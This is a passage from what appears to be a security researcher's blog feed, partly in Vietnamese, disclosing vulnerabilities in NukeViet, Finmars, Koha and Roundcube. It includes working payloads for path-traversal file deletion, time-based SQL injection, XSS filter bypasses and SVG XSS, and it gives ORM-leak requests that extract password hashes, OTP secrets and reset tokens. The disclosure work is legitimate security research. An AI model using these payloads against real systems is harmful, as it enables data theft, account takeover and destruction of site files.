</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__serverInfoUpdate</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p></p>
<p></p>
<p><code>oast.fun</code></p>
<p></p>
<p></p>
<h2 id="path-traversal-to-arbitrary-file-deletion-in-edit-comment-function"><strong>Path Traversal to Arbitrary File Deletion in Edit Comment Function</strong></h2>
<h3 id="description-2">Description</h3>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Version Affected</strong></th>
<th><strong>Authentication required</strong></th>
<th><strong>?-day</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Path traversal</td>
<td>≤ 4.5.08</td>
<td>Yes (Admin)</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h3 id="root-cause-2">Root Cause</h3>
<p><code>modules/comment/admin/edit.php</code></p>
<p></p>
<p>Dòng 48, ứng dụng nhận giá trị  <code>attach</code> qua HTTP POST.</p>
<p>Dòng 50, hàm substr() thực hiện cắt bỏ phần tiền tố của attach</p>
<p>VD:</p>
<ul>
<li><code>NV_BASE_SITEURL</code>: <code>/nukeviet/</code></li>
<li><code>NV_UPLOADS_DIR</code>: <code>uploads</code></li>
<li><code>$module_upload</code>: <code>comment</code></li>
</ul>
<p>→  <strong><code>/nukeviet/uploads/comment/</code></strong> </p>
<p>Hàm <code>strlen('/nukeviet/uploads/comment/')</code> đếm độ dài chuỗi này là <strong>26 ký tự</strong>.</p>
<p>→ <code>$attach = substr($attach, 26);</code> : lấy chuỗi từ vị trí thứ 26 trở đi.</p>
<p>Dòng 55,  <code>$attach</code> được lưu vào database.</p>
<p></p>
<p>Sau đó, lỗ hổng Xóa file bị kích hoạt tại:</p>
<p><code>modules/comment/admin/del.php</code></p>
<p></p>
<p></p>
<p>Do hàm <code>nv_deletefile()</code> không có các bước chặn path traversal và chỉ giới hạn việc xóa không vượt quá Root Dir mà không chặn xóa tệp ngoài thư mục Upload. Do đó, các tệp như  <code>config.php</code> sẽ bị xóa mất bằng payload:</p>
<p><code>attach=aaaaaaaaaaaaaaaaaaaaaaaaaa../../config.php</code> (26 ký tự a)</p>
<h3 id="steps-to-reproduce-2">Steps to reproduce</h3>
<p>Goal: Xóa file <code>config.php</code></p>
<p>Truy cập trang admin → Quản lý bình luận</p>
<p></p>
<p>Chọn một bình luận bất kỳ và edit:</p>
<p></p>
<p>Intercept lại request và thêm payload <code>aaaaaaaaaaaaaaaaaaaaaaaaaa../../config.php</code> vào param <code>attach</code>:</p>
<p></p>
<p>Forward và tiến hành xóa bình luận đó:</p>
<p></p>
<p>Xóa thành công file config → Ứng dụng tự động redirect về trang install:</p>
<p></p>
<h2 id="post-auth-sql-injection-in-module_shops-version--4503-of-nukeviet"><strong>Post-Auth SQL Injection in module_shops version &lt;= 4.5.03 of nukeviet</strong></h2>
<h3 id="description-3">Description</h3>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Version Affected</strong></th>
<th><strong>Authentication required</strong></th>
<th>?-day</th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Injection</td>
<td>≤ 4.5.08, module_shops &lt;= 4.5.03</td>
<td>Yes</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h3 id="root-cause-3">Root cause</h3>
<p><code>modules\shops\admin\order.php</code></p>
<p></p>
<p>The data from the <code>order_payment</code> parameter is concatenated directly into the SQL query without validation.</p>
<p>This query is executed at:</p>
<p></p>
<h3 id="steps-to-reproduce-3">Steps to reproduce</h3>
<p>Log in with an administrator account and navigate to the Shops module:</p>
<p></p>
<p>Intercept the <code>Search</code> request and inject the following payload into the order_payment parameter: <code>-999%20or%20sleep(3)%20--%20a</code></p>
<p>This payload causes the application to sleep for a total of 18 seconds (3 seconds for each of the 6 columns).</p>
<p></p>
<h2 id="multiple-anti-xss-filter-bypasses-leading-to-stored-xss-in-news-module"><strong>Multiple Anti-XSS Filter Bypasses leading to Stored XSS in News Module.</strong></h2>
<h3 id="description-4">Description</h3>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Version Affected</strong></th>
<th><strong>Authentication required</strong></th>
<th><strong>?-day</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Stored XSS</td>
<td>≤ 4.5.08</td>
<td>Yes (Low)</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h3 id="root-cause-4">Root cause</h3>
<p><code>modules/news/funcs/content.php</code></p>
<p></p>
<p></p>
<p>Tại Dòng 392-393, hệ thống lấy dữ liệu nội dung từ POST Request.
Do hằng số <code>NV_EDITOR</code> luôn được định nghĩa, hệ thống sẽ thực thi nhánh <code>nv_nl2br($bodyhtml, '')</code>. Hàm này chỉ xử lý ngắt dòng và không có chức năng làm sạch dữ liệu.</p>
<p></p>
<p>Ứng dụng chỉ validate input người dùng bằng hàm <code>get_string()</code> với request POST.
Đi vào hàm <code>get_string()</code> -&gt; <code>get_value()</code> -&gt; <code>security_post()</code>:</p>
<p></p>
<p>Hàm <code>security_pos()</code> (dòng 1058) gọi <code>$value = $this-&gt;filterTags($value);</code>
Tại đây ứng dụng gọi hàm <code>filterAttr()</code> :</p>
<p></p>
<p>Đi vào hàm <code>filterAttr()</code>:</p>
<p></p>
<p>Do hàm <code>trim()</code> của PHP chỉ xóa các ký trị khoảng trắng, không xóa ký tự <code>Form Feed (0x0C)</code> , chuỗi <code>[0x0C]onerror</code> dễ dàng vượt qua bộ lọc <code>preg_match('/^on/i')</code> để lưu vào cơ sở dữ liệu. Khi hiển thị ở frontend, trình duyệt HTML5 lại nhận diện <code>0x0C</code> là một khoảng trắng hợp lệ, từ đó kích hoạt thuộc tính <code>onerror</code> và thực thi javascript.
Payload mẫu: <code>&lt;img src=x %0Conerror=alert('0-click-XSS')&gt;</code></p>
<p>Ngoài ra, còn có thể Bypass data URI bằng Entity <code>&amp;#9;</code> (XSS qua thẻ <!-- raw HTML omitted -->).</p>
<p></p>
<p>Regex sử dụng <code>\s*</code> để bắt khoảng trắng, nhưng <code>\s</code> của PHP không hiểu Entity <code>&amp;#9;</code> . Do đó, Regex không phát hiện ra javascript. Có thể sử dụng HTML Entity (Tab) chèn vào giữa chữ javascript để bỏ qua <code>preg_replace</code> này.</p>
<p>Payload mẫu: <code>&lt;a href=&quot;jav&amp;#9;ascript:alert('XSS_Bypass')&quot;&gt;Click me&lt;/a&gt;</code></p>
<h3 id="steps-to-reproduce-4">Steps to reproduce</h3>
<p>Sử dụng tài khoản user có quyền đăng bài viết.</p>
<p>Tin tức -&gt; Quản lý bài viết -&gt; Đăng bài viết</p>
<p></p>
<p>Đăng bài viết với đầy đủ thông tin và Intercept request.</p>
<p></p>
<p>Chèn payload: <code>Content%3a%20%3cimg%20src%3d%22x%22%20%0conerror%3d%22alert('0-click-XSS')%22%20%3e</code> vào trường <code>bodyhtml</code> và Forward Request:</p>
<p></p>
<p>Truy cập Tin tức -&gt; Quản lý bài viết -&gt; Bài viết vừa tạo:</p>
<p></p>
<p>XSS Triggered.</p>
<p>Làm tương tự với cách bypass thứ 2 kèm payload: <code>Content%3a+&lt;a+href%3d&quot;jav%26%239%3bascript%3aalert('XSS_Bypass')&quot;&gt;Click+me&lt;/a&gt;</code></p>
<p></p>
<p>Click <code>Click me</code> -&gt; XSS Triggered</p>
<p></p>
]]></description>
</item>
<item>
    <title>Post-Auth SQL Injection in module_shops version &lt;= 4.5.03 of nukeviet</title>
    <link>https://g03m0n.github.io/posts/nukeviet-sql-injection/</link>
    <pubDate>Tue, 12 May 2026 08:31:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/nukeviet-sql-injection/</guid>
    <description><![CDATA[<h1 id="post-auth-sql-injection-in-module_shops-version--4503-of-nukeviet">Post-Auth SQL Injection in module_shops version &lt;= 4.5.03 of nukeviet</h1>
<h3 id="url--location-of-vulnerability">URL / Location of vulnerability</h3>
<pre tabindex="0"><code>http://&lt;domain&gt;/nukeviet/admin/index.php?nv=shops&amp;op=order&amp;order_code=&amp;from=&amp;to=&amp;order_email=&amp;order_payment=-999%20or%20sleep(3)%20--%20a&amp;checkss=78ed08fc21971e735b01e04647bb90d8&amp;search=Search
</code></pre><h3 id="description">Description</h3>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Version Affected</strong></th>
<th><strong>Authentication required</strong></th>
<th>?-day</th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL Injection</td>
<td>≤ 4.5.08, module_shop &lt;= 4.5.03</td>
<td>Yes</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h3 id="root-cause">Root cause</h3>
<p><code>modules\shops\admin\order.php</code></p>
<p></p>
<p>The data from the <code>order_payment</code> parameter is concatenated directly into the SQL query without validation.</p>
<p>This query is executed at:</p>
<p></p>
<h3 id="steps-to-reproduce">Steps to reproduce</h3>
<p>Log in with an administrator account and navigate to the Shops module:</p>
<p></p>
<p>Intercept the <code>Search</code> request and inject the following payload into the <code>order_payment</code> parameter: <code>-999%20or%20sleep(3)%20--%20a</code></p>
<p>This payload causes the application to sleep for a total of 18 seconds (3 seconds for each of the 6 columns).</p>
<p></p>
<h3 id="commit">Commit</h3>
<p><a href="https://github.com/nukeviet/module-shops/commit/1b6d2ab792dd525ff660ecfbb848b1295cc28b19" target="_blank" rel="noopener noreffer">https://github.com/nukeviet/module-shops/commit/1b6d2ab792dd525ff660ecfbb848b1295cc28b19</a>
</p>
]]></description>
</item>
<item>
    <title>ORM Leak Vulnerability in Finmars</title>
    <link>https://g03m0n.github.io/posts/orm-leak-vulnerability-in-finmars/</link>
    <pubDate>Tue, 31 Mar 2026 08:31:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/orm-leak-vulnerability-in-finmars/</guid>
    <description><![CDATA[<h1 id="orm-leak-vulnerability-in-finmars">ORM Leak Vulnerability in Finmars</h1>
<p>I recently conducted research on <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2025#:~:text=2%20%2D%20ORM%20Leaking%20More%20Than%20You%20Joined%20For" target="_blank" rel="noopener noreffer">ORM Leaking</a>
 - Top 2 web hacking technique by PortSwigger. Following this study, I utilized <a href="https://sourcegraph.com/search?q=context:global&#43;lang:python&#43;/%5C.filter%5C%28%5C*%5C*%5Ba-zA-Z0-9_%5D%2B%5C%29%5C./&amp;patternType=keyword&amp;sm=0" target="_blank" rel="noopener noreffer">Sourcegraph</a>
 to scan open-source repositories for potential vulnerabilities. This investigation led to the discovery of an ORM Leaking flaw within the <strong>Finmars</strong> repository.</p>
<p></p>
<p>Let&rsquo;s analyze the vulnerability.</p>
<h2 id="description-and-impact">Description and Impact</h2>
<table>
<thead>
<tr>
<th>Type</th>
<th>Version Affected</th>
<th>Required Authentication</th>
<th>?-day</th>
</tr>
</thead>
<tbody>
<tr>
<td>ORM Leaking</td>
<td>finmars-core ≤ 1.24.5</td>
<td>Yes</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h2 id="root-cause-analysis"><strong>Root Cause Analysis</strong></h2>
<h3 id="the-source"><strong>The Source</strong></h3>
<p>The application contains a security vulnerability within the category data extraction feature (<code>/api/v1/specific-data/values-for-select/</code>). This endpoint is designed to return values to the user interface based on a specified model and column name (<code>key</code>).</p>
<p><code>poms\api\urls.py</code></p>
<p></p>
<p>The vulnerability is the result of passing Untrusted Input directly from the API ViewSet down to the low-level ORM processing function.
In the <code>ValuesForSelectViewSet</code> class, the application accepts the <code>content_type</code> and <code>key</code> parameters from the URL but does not apply any Whitelist:</p>
<p><code>poms\common\views.py#L563</code></p>
<p></p>
<h3 id="the-sink"><strong>The Sink</strong></h3>
<p>The <code>key</code> variable carrying the payload (e.g., <code>user__password</code>) is passed into the <code>_get_values_for_select</code> function. Here, it is directly embedded into Django ORM functions.</p>
<p><code>poms\common\views.py#L434</code></p>
<p></p>
<p>When <code>.values_list('user__password', flat=True)</code> is called, the Django ORM automatically generates an <code>INNER JOIN</code> statement connecting the <code>users_member</code> table to the <code>auth_user</code> table and extracts the <code>password</code> column, completely bypassing the developer&rsquo;s original security intent.</p>
<p><strong>Equivalent SQL Query:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">DISTINCT</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;password&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">&#34;users_member&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INNER</span> <span style="color:#66d9ef">JOIN</span> <span style="color:#e6db74">&#34;auth_user&#34;</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ON</span> (<span style="color:#e6db74">&#34;users_member&#34;</span>.<span style="color:#e6db74">&#34;user_id&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;id&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;users_member&#34;</span>.<span style="color:#e6db74">&#34;master_user_id&#34;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">123</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">AND</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#66d9ef">IS</span> <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#66d9ef">ASC</span>;
</span></span></code></pre></div><h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<p><strong>Step 1:</strong> Log into the system as a regular user (Member) to obtain a valid Access Token.</p>
<p><strong>Step 2:</strong> Send an HTTP GET request with a specially crafted payload:</p>
<ul>
<li><code>content_type</code>: Set to <code>users.member</code> (this table contains the <code>master_user</code> column, preventing a 500 Internal Server Error when passing through the authorization filter).</li>
<li><code>key</code>: Set to <code>user__password</code> (utilizing ORM traversal to jump to the <code>auth_user</code> table).</li>
</ul>
<p>The final payload looks like this: <code>/realm00000/space00000/api/v1/specific-data/values-for-select/?content_type=users.member&amp;value_type=10&amp;key=user__password</code></p>
<p>Request example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">realm00000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">space00000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">v1</span><span style="color:#f92672">/</span><span style="color:#a6e22e">specific</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span><span style="color:#f92672">/</span><span style="color:#a6e22e">values</span><span style="color:#f92672">-</span><span style="color:#66d9ef">for</span><span style="color:#f92672">-</span><span style="color:#a6e22e">select</span><span style="color:#f92672">/?</span><span style="color:#a6e22e">content_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">member</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">value_type</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">key</span><span style="color:#f92672">=</span><span style="color:#a6e22e">user__password</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0</span>.<span style="color:#ae81ff">0.1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">cookie</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ua</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Chromium&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;107&#34;</span>, <span style="color:#e6db74">&#34;Not=A?Brand&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;24&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Mobile</span><span style="color:#f92672">:</span> <span style="color:#f92672">?</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">10.0</span>; <span style="color:#a6e22e">Win64</span>; <span style="color:#a6e22e">x64</span>) <span style="color:#a6e22e">AppleWebKit</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (<span style="color:#a6e22e">KHTML</span>, <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">Gecko</span>) <span style="color:#a6e22e">Chrome</span><span style="color:#f92672">/</span><span style="color:#ae81ff">107.0</span>.<span style="color:#ae81ff">5304.107</span> <span style="color:#a6e22e">Safari</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Platform</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Linux&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">:</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">/*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Site</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">same</span><span style="color:#f92672">-</span><span style="color:#a6e22e">origin</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Mode</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">cors</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Dest</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">empty</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//127.0.0.1/realm00000/space00000/v/system/iam/member?page=1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Encoding</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">gzip</span>, <span style="color:#a6e22e">deflate</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Language</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">en</span><span style="color:#f92672">-</span><span style="color:#a6e22e">US</span>,<span style="color:#a6e22e">en</span>;<span style="color:#a6e22e">q</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">close</span>
</span></span></code></pre></div><p></p>
<p>The impact extends far beyond password hashes. Because the ORM allows arbitrary <code>JOIN</code> operations, an attacker can extract any sensitive data linked to the source table via foreign keys. For example, by altering the <code>key</code> parameter, an attacker can extract:</p>
<ul>
<li><strong>2FA/MFA Secrets: <code>key=user__otp_tokens__secret</code></strong></li>
<li><strong>Password Reset Tokens: <code>key=user__password_reset_tokens__key</code></strong></li>
<li><strong>PII &amp; Private Data:  <code>key=user__notifications__message</code></strong></li>
</ul>
<p>This allows for zero-interaction Account Takeover (ATO) and massive data breaches across the entire system.</p>
<h2 id="recomendation">Recomendation</h2>
<p>Strict input validation must be applied in <code>_get_values_for_select</code> to prevent users from leveraging Django ORM <strong>relation traversal</strong>.</p>
<h2 id="references">References</h2>
<p><a href="https://www.elttam.com/blog/plormbing-your-django-orm" target="_blank" rel="noopener noreffer">https://www.elttam.com/blog/plormbing-your-django-orm</a>
</p>
]]></description>
</item>
<item>
    <title>SSRF in Koha version ≤ 25.11 (CVE-2026-26379)</title>
    <link>https://g03m0n.github.io/posts/cve-2026-26379/</link>
    <pubDate>Wed, 31 Dec 2025 08:31:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2026-26379/</guid>
    <description><![CDATA[<h1 id="ssrf-in-koha-version--2511-cve-2026-26379">SSRF in Koha version ≤ 25.11 (CVE-2026-26379)</h1>
<h2 id="description-and-impact">Description and Impact</h2>
<table>
<thead>
<tr>
<th><strong>Type</strong></th>
<th><strong>Affected Version</strong></th>
<th><strong>?-day</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SSRF</td>
<td>≤25.11 (latest)</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<p>First, from the Dashboard interface, go to <strong>Koha Administration</strong> → <strong>Z39.50/SRU servers:</strong></p>
<p></p>
<p>Select <strong><code>+ New Z39.50 server</code></strong></p>
<p></p>
<p>Assume the internal network is hosting an application on port 8888: <code>nc -nvlp 8888</code></p>
<p></p>
<p>Fill in the information as follows:</p>
<p></p>
<p>Save.</p>
<p>Go to <a href="http://192.168.116.130:8080/cgi-bin/koha/cataloguing/z3950_search.pl" target="_blank" rel="noopener noreffer">http://192.168.116.130:8080/cgi-bin/koha/cataloguing/z3950_search.pl</a>
 and fill in the information as shown in the image:</p>
<p></p>
<p>Click Search.</p>
<p>A request is sent to the server:</p>
<p></p>
<ul>
<li>If the response is <code>Connection timeout</code>, it means there is an internal service with port 8888 open:</li>
</ul>
<p></p>
<ul>
<li>If there is no service listening on port 8888, the response is <code>Connection failed</code>:</li>
</ul>
<p></p>
]]></description>
</item>
<item>
    <title>Cross-Site Scripting via File Upload in Koha (CVE-2026-26378)</title>
    <link>https://g03m0n.github.io/posts/cve-2026-26378/</link>
    <pubDate>Wed, 31 Dec 2025 08:30:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2026-26378/</guid>
    <description><![CDATA[<h1 id="cross-site-scripting-via-file-upload-in-koha-cve-2026-26378">Cross-Site Scripting via File Upload in Koha (CVE-2026-26378)</h1>
<h2 id="description-and-impact">Description and Impact</h2>
<table>
<thead>
<tr>
<th>Type</th>
<th>Version Affected</th>
<th>?-day</th>
</tr>
</thead>
<tbody>
<tr>
<td>XSS via File Upload</td>
<td>≤ 25.11 (latest)</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<p>First, create an arbitrary vendor (if one already exists, skip this step):</p>
<p></p>
<p>Vendor <code>ABC</code> was successfully created.
Access <strong><code>Receive Shipments</code></strong> to create a new Invoice:</p>
<p></p>
<p></p>
<p>Successfully created an Invoice with <code>invoiceid=3</code> :</p>
<p></p>
<p>Then, access the URL: <code>cgi-bin/koha/acqui/invoice-files.pl?invoiceid=3</code> :</p>
<p></p>
<p>Proceed to upload an SVG file containing the XSS payload as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bnf" data-lang="bnf"><span style="display:flex;"><span>&lt;<span style="color:#a6e22e">svg xmlns=&#34;http://www.w3.org/2000/svg&#34; onload=&#34;alert(document.domain)&#34;</span>&gt;&lt;<span style="color:#a6e22e">/svg</span>&gt;
</span></span></code></pre></div><p></p>
<p>Since the application allows <code>inline</code> rendering for files with an <code>image</code> Content-Type, it is possible to upload an SVG file containing an XSS payload. Clicking to view the file will cause the JavaScript to execute in the browser → <strong>Triggering XSS</strong>.</p>
<p></p>
]]></description>
</item>
<item>
    <title>Stored XSS in Koha version ≤25.11 (CVE-2026-26377)</title>
    <link>https://g03m0n.github.io/posts/cve-2026-26377/</link>
    <pubDate>Wed, 31 Dec 2025 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2026-26377/</guid>
    <description><![CDATA[<h1 id="stored-xss-in-koha-version-2511-cve-2026-26377">Stored XSS in Koha version ≤25.11 (CVE-2026-26377)</h1>
<h2 id="description-and-impact">Description and Impact</h2>
<table>
<thead>
<tr>
<th>Type</th>
<th>Version Affected</th>
<th>Required Authentication</th>
<th>?-day</th>
</tr>
</thead>
<tbody>
<tr>
<td>Stored XSS</td>
<td>≤ 25.11</td>
<td>Yes</td>
<td>0-day</td>
</tr>
</tbody>
</table>
<p>This vulnerability poses a critical risk as the malicious payload is saved on the server, affecting multiple users without requiring social engineering. Successful exploitation permits attackers to exfiltrate sensitive data, impersonate high-privileged users (Administrator account takeover), and compromise the confidentiality and integrity of the application.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<p>(Tesing on <strong>Koha</strong> version <strong>25.05.02.000</strong> and tested on version <strong>25.11</strong>)</p>
<p></p>
<p>Log in using an account with permission to add <strong>News.</strong></p>
<p>Go to <strong>Tools → News → New Entry</strong></p>
<p></p>
<p>Add any post and <strong>Save.</strong></p>
<p>Then edit that post using <strong><code>Edit with Text Editor</code></strong></p>
<p></p>
<p>Add payload : <code>&quot;&gt;&lt;script&gt;alert(&quot;Stored XSS&quot;)&lt;/script&gt;</code> into content.</p>
<p></p>
<p><strong>Save → Trigger XSS</strong></p>
<p></p>
<p>Additionally, when returning to the <strong>Mainpage</strong>, XSS is also <strong>Triggered</strong> because there are no measures to control the content before rendering it to the screen.</p>
<p></p>
]]></description>
</item>
<item>
    <title>Stored-XSS via animate tag in Roundcube (CVE-2025-68461)</title>
    <link>https://g03m0n.github.io/posts/cve-2025-68461/</link>
    <pubDate>Wed, 31 Dec 2025 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2025-68461/</guid>
    <description><![CDATA[<h1 id="stored-xss-via-animate-tag-in-roundcube-cve-2025-68461">Stored-XSS via animate tag in Roundcube (CVE-2025-68461)</h1>
<h2 id="description-and-impact">Description and Impact</h2>
<table>
<thead>
<tr>
<th>Type</th>
<th>Version Affected</th>
<th>Authentication Required</th>
<th>?-day</th>
<th>CVSS</th>
</tr>
</thead>
<tbody>
<tr>
<td>Stored-XSS</td>
<td>&lt;1.5.12, &lt;1.6.12</td>
<td>Yes</td>
<td>1-day</td>
<td>7.2</td>
</tr>
</tbody>
</table>
<p>Roundcube Webmail before 1.5.12 and 1.6 before 1.6.12 is prone to a Cross-Site-Scripting (XSS) vulnerability via the animate tag in an SVG document.</p>
<h2 id="root-cause-analysis">Root cause analysis</h2>
<p><code>program\lib\Roundcube\rcube_washtml.php:dumpHtml()</code></p>
<p></p>
<p>Ứng dụng kiểm tra xem thẻ hiện tại (<code>$tagName</code>) có phải là một trong các thẻ hoạt ảnh (<code>animate</code>, <code>animatecolor</code>, …) hay không. Nếu đúng, nó gọi tiếp hàm <code>self::attribute_value</code> để kiểm tra xem thẻ này có chứa thuộc tính tên là <code>attributename</code> và giá trị của nó có đang được đặt là <code>href</code> hay không. Nếu cả 2 điều kiện đúng, nó sẽ chặn thẻ này.</p>
<p></p>
<p>Hàm <code>attribute_value</code> đi tìm trong thẻ đó xem có thuộc tính nào khớp tên (<code>$attr_name</code>) và khớp giá trị (<code>$attr_value</code>) hay không. Ở đây là nó <strong>so sánh chuỗi chính xác</strong> (chỉ bỏ qua chữ hoa/chữ thường và khoảng trắng thừa).</p>
